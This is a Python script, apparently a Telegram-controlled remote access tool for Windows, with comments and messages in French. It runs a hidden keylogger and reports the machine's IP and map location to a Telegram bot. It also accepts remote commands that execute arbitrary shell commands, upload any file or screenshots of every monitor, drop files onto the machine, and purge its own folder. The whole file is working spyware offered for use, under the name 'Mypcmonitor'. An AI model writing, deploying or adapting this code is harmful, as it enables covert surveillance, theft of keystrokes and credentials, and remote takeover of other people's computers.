import requests, datetime, time, geocoder, threading, json, sys, subprocess, os, mss, keyboard, pathlib, shutil
 
"""
pip install requests geocoder mss keyboard pathlib
"""
 
commandes = """
Envoyer photo ou document
/cd DIR
/cmd SHELL_COMMAND
/getFile PATH
/maindir
/screenshot
/keylogger_start
/keylogger_stop
/keylogger_flush
/keylogger_get
/keylogger_status
/purgeall
"""
 
def on_key_press(event):
    
    #print(event)
    
    if keylogging:
    
        with open(log_file, 'a') as f:
            
            if len(event.name) > 1: event.name = f"[{event.name}]"
            f.write(f"{event.name}")
            if event.name == "[enter]":
                f.write("\n")
 
def startKeylogger():
    
    try:
        print("Logger started")
        keyboard.on_press(on_key_press)
        keyboard.wait()
    
    except Exception as error: 
        print(error)
 
 
def sendDocument(path=""):
    
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={chat_id}"
    print(requests.post(url, files={"document":open(path, "rb")}).text)
    
 
def sendPhoto(path=""):
    
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto?chat_id={chat_id}"
    print(requests.post(url, files={"photo":open(path, "rb")}).text)
    
 
def sendMessage(message=""):
    
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
    print(requests.get(url).text)
    
 
def get_current_gps_coordinates():
    g = geocoder.ip('me')#this function is used to find the current information using our IP Add
    if g.latlng is not None: #g.latlng tells if the coordiates are found or not
        return g.latlng
    else:
        return None
 
 
appdata = os.getenv('APPDATA')
maindir = f"{appdata}\\Mypcmonitor"
startdir = pathlib.Path(__file__).parent.resolve()
pathlib.Path(maindir).mkdir(parents=True, exist_ok=True)
pathlib.Path(f"{maindir}\\photos").mkdir(parents=True, exist_ok=True)
pathlib.Path(f"{maindir}\\documents").mkdir(parents=True, exist_ok=True)
log_file = maindir+'\\keystrokes.txt'

if not pathlib.Path(f"{startdir}\\credentials.txt").exists():
    print("identifiants requis")
    input()
    sys.exit(0)
else:
    with open(f"{startdir}\\credentials.txt", 'r') as fcred: credentials = json.loads(fcred.read())


keylogging = True
first = True
last_time_recieved = round(datetime.datetime.now().timestamp())
print(last_time_recieved)
last_update = 0

keylogger = threading.Thread(target=startKeylogger)
keylogger.start()


 
while True:
    
    try:
        
        print("online")
        
        if first:
            
            TOKEN = credentials['token']
            chat_id = credentials['chat_id']
            date = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
            coords = get_current_gps_coordinates()
            ip = requests.get('https://checkip.amazonaws.com').text.strip()
            message = f"PC en ligne le {date} au lieu suivant : https://www.google.com/maps/place/{coords[0]},{coords[1]} IP {ip}\nCommands : \n{commandes}"
            
            sendMessage(message)
            
            first = False
        
        
        url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?chat_id={chat_id}&offset={last_update}"
        p = json.loads(requests.get(url).text)
        #print(p)
        
        if p['ok']:
            
            last_message = p['result'][-1]
            last_update = last_message['update_id']
            print (last_message)
            
            if last_message['message']['date'] > last_time_recieved:
                
                print(f"{last_message['message']['date']} > {last_time_recieved}")
                
                if 'text' in last_message['message']: print("TEXT "+last_message['message']['text'])
                if 'caption' in last_message['message']: print("CAPTION "+last_message['message']['caption']) 
                
                last_time_recieved = round(datetime.datetime.now().timestamp())
                
                if 'photo' in last_message['message']:
                    
                    print("PHOTO FOUND")
                    
                    for photo in last_message['message']['photo']:
                        
                        url = f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={photo['file_id']}"
                        ph = json.loads(requests.get(url).text)
                        print("PH")
                        print(ph)
                        if ph['ok']:
                            
                            url2 = f"https://api.telegram.org/file/bot{TOKEN}/{ph['result']['file_path']}"
                            print(url2)
                            fichier = requests.get(url2).content
                            print("FICHIER")
                            print(fichier)
                            
                            with open(f"{maindir}\\{ph['result']['file_path']}", 'wb') as fw: fw.write(fichier)
                            
                            sendMessage(f"Fichier {maindir}\\{ph['result']['file_path']} bien écrit")
                            
                elif 'document' in last_message['message']:
                    
                    print("DOC FOUND")
                    
                    doc = last_message['message']['document']
                        
                    url = f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={doc['file_id']}"
                    dh = json.loads(requests.get(url).text)
                    print("DH")
                    print(dh)
                    if dh['ok']:
                        
                        url2 = f"https://api.telegram.org/file/bot{TOKEN}/{dh['result']['file_path']}"
                        print(url2)
                        fichier = requests.get(url2).content
                        print("FICHIER")
                        print(fichier)
                        
                        with open(f"{maindir}\\documents\\{doc['file_name']}", 'wb') as fw: fw.write(fichier)
                            
                        sendMessage(f"Fichier {maindir}\\documents\\{doc['file_name']} bien écrit")
                
                elif "/man" in last_message['message']['text']:
                    sendMessage(f"commands : \n{commandes}")
                    
                elif "/keylogger_flush" in last_message['message']['text']:
                    os.remove(log_file)
                 
                elif "/keylogger_start" in last_message['message']['text']:
                    keylogging = True
                    with open(log_file, 'a') as f: f.write("START "+datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")+"\n")
                 
                elif "/keylogger_stop" in last_message['message']['text']:
                    with open(log_file, 'a') as f: f.write("\nSTOP "+datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")+"\n")
                    keylogging = False
                 
                elif "/keylogger_get" in last_message['message']['text']:
                    sendDocument(log_file)
                    
                elif "/keylogger_status" in last_message['message']['text']:
                    sendMessage("ON" if keylogging else "OFF")
                
                elif "/screenshot" in last_message['message']['text']:
 
                    with mss.mss() as sct: 
                        
                        for i in range(1, 3):
                            sct.shot(mon=i, output=f"{maindir}\\screen.png")
                            sendPhoto(f"{maindir}\\screen.png")
                            os.remove(f"{maindir}\\screen.png")
                    
                elif "/getFile" in last_message['message']['text']:
 
                    cmd = last_message['message']['text'].split("/getFile ")[1]
                    sendDocument(cmd)
                
                
                elif "/cd" in last_message['message']['text']:
                    
                    cmd = last_message['message']['text'].split("/cd ")[1]
                    os.chdir(cmd)
                
                elif "/maindir" in last_message['message']['text']:
                    
                    os.chdir(maindir)
                
                elif "/cmd" in last_message['message']['text']:
                    
                    cmd = last_message['message']['text'].split("/cmd ")[1]
                    print("CMD " + cmd)
                    out = subprocess.getoutput(cmd)
                    print("OUT" + out)
                    sendMessage(out)
                
                elif "/purgeall" in last_message['message']['text']:
                    
                    shutil.rmtree(maindir) 
                    sendMessage(f"{maindir} purge")
                    os._exit(0)
                
                else:
                    pass
                        
                
                out = subprocess.getoutput("cd")
                sendMessage(f"/man {out}>")
                
            else:
                print(f"{last_message['message']['date']} < {last_time_recieved}")
            
    except Exception as error:
        
        print(error)
    
    time.sleep(5)